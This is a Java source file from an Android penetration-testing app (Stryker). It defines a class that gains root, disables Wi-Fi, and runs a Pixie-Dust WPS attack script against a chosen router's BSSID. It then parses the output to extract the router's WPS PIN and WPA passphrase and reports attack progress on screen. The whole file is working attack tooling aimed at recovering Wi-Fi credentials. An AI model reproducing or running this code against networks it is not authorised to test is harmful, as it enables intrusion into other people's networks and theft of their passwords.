package com.zalexdev.stryker.wifi.utils;

import static android.content.ContentValues.TAG;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.os.AsyncTask;
import android.text.Html;
import android.text.Spanned;
import android.util.Log;
import android.widget.TextView;

import com.zalexdev.stryker.R;
import com.zalexdev.stryker.custom.WiFiNetwork;
import com.zalexdev.stryker.utils.Core;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.util.ArrayList;

/**
 * This class is used to run the pixie-dust attack
 */
public class PixieDust extends AsyncTask<Void, String, WiFiNetwork> {
    @SuppressLint("StaticFieldLeak")
    public final TextView output;
    public String exec = Core.EXECUTE;
    public Process process;
    @SuppressLint("StaticFieldLeak")
    public Context mContext;
    @SuppressLint("StaticFieldLeak")
    public Activity mActivity;
    public String bssid;
    public String wifi_name;
    public Core core;
    public boolean killed = false;

    public PixieDust(Context context, Activity activity, final TextView out, String bssid1, String wifi_name1, Core c) {
        mContext = context;
        mActivity = activity;
        output = out;
        bssid = bssid1;
        wifi_name = wifi_name1;
        core = c;
    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();

    }

    @SuppressLint("WrongThread")
    @Override
    protected WiFiNetwork doInBackground(Void... command) {
        String line;
        WiFiNetwork issuccess = new WiFiNetwork();
        try {
            process = Runtime.getRuntime().exec("su -mm");
            OutputStream stdin = process.getOutputStream();
            InputStream stderr = process.getErrorStream();
            InputStream stdout = process.getInputStream();

            String cmd = "timeout 45 python3 -u /CORE/PixieWps/pixie.py -i " + core.getString("wlan_scan") + " --iface-down -K -F -b " + bssid;
            if (core.getBoolean("pixie_off")) {
                cmd = "timeout 45 python3 -u /CORE/PixieWps/pixie.py -i " + core.getString("wlan_scan") + " -K -F -b " + bssid;
                stdin.write((exec + " '" + cmd + "'" + " &&echo PIXIEFINISHED" + '\n').getBytes());
            } else {
                stdin.write(("svc wifi disable&&sleep 2&&" + exec + " '" + cmd + "'" + " &&echo PIXIEFINISHED&&sleep 2&&svc wifi enable" + '\n').getBytes());
            }
            stdin.write(("exit\n").getBytes());
            stdin.flush();
            stdin.close();
            ArrayList<String> out2 = new ArrayList<>();
            ArrayList<String> outerror = new ArrayList<>();
            BufferedReader br = new BufferedReader(new InputStreamReader(stdout));
            int countaperror = 0;
            while ((line = br.readLine()) != null) {
                out2.add(line);
                onProgressUpdate(line);
                if (line.contains("Associated")){
                    countaperror++;
                }else{
                    countaperror = 0;
                }
                if (countaperror >5){
                    process.destroy();
                }
            }
            br.close();
            br = new BufferedReader(new InputStreamReader(stderr));
            while ((line = br.readLine()) != null) {
                onProgressUpdate(line);
                outerror.add(line);
            }
            core.writetolog(out2, false);
            core.writetolog(outerror, true);
            br.close();
            process.waitFor();
            process.destroy();
            issuccess = pixie(out2);

        } catch (IOException e) {
            Log.d(TAG, "An IOException was caught: " + e.getMessage());
        } catch (InterruptedException ex) {
            Log.d(TAG, "An InterruptedException was caught: " + ex.getMessage());
        }
        if (killed){
            issuccess.setCanceled(true);
        }
        return issuccess;
    }

    public void kill() {
        killed = true;
        process.destroy();

    }

    @Override
    protected void onPostExecute(WiFiNetwork result) {
        super.onPostExecute(result);
    }

    @Override
    protected void onProgressUpdate(String... values) {
        super.onProgressUpdate(values);
        String temp = values[0];
        if (temp.contains("Trying pin")) {
            settext(white(core.str("send_pin")), output);
        } else if (temp.contains("Associated")) {
            settext(green(core.str("target_locked")), output);
        } else if (temp.contains("Message M1")) {
            settext(green(core.str("m1")), output);
        } else if (temp.contains("Message M2")) {
            settext(green(core.str("m2")), output);
        } else if (temp.contains("E-Nonce")) {
            settext(white(core.str("enon")), output);
        } else if (temp.contains("PKR: ")) {
            settext(green(core.str("pkr")), output);
        } else if (temp.contains("PKE: ")) {
            settext(green(core.str("pke")), output);
        } else if (temp.contains("AuthKey: ")) {
            settext(green(core.str("authkey")), output);
        } else if (temp.contains("Message M4 ")) {
            settext(white(core.str("m4")), output);
        } else if (temp.contains("[+] WPS pin: ")) {
            settext(green(core.str("wps_pin")+temp.replace("[+] WPS pin: ","")), output);
        }
    }

    public void settext(Spanned text, TextView textView) {
        mActivity.runOnUiThread(() -> {
            textView.setText(text.toString());
        });
    }


    public WiFiNetwork pixie(ArrayList<String> out) {
        String pin;
        String pass;

        WiFiNetwork back = new WiFiNetwork();
        for (int i = 0; i < out.size(); i++) {
            String s = out.get(i);
            if (s.contains("[+] WPS PIN:")) {
                pin = s.replace("[+] WPS PIN: ", "").replaceAll("'", "");
                back.setPin(pin);
                back.setOK(true);
            } else if (s.contains("[+] WPA PSK:")) {
                pass = s.replace("[+] WPA PSK: ", "").replaceAll("'", "");
                back.setPsk(pass);
                back.setOK(true);
            } else if (s.contains("Terminated")) {
                back.setOK(false);
            }
        }
        if (out.isEmpty()) {
            back.setLon("ERROR");
        }
        return back;
    }

    public Spanned green(String out) {
        return Html.fromHtml("<font color='#19D121'>" + out + "</font>");
    }

    public Spanned white(String out) {
        return Html.fromHtml("<font color='#FFFFFF'>" + out + "</font>");
    }


}
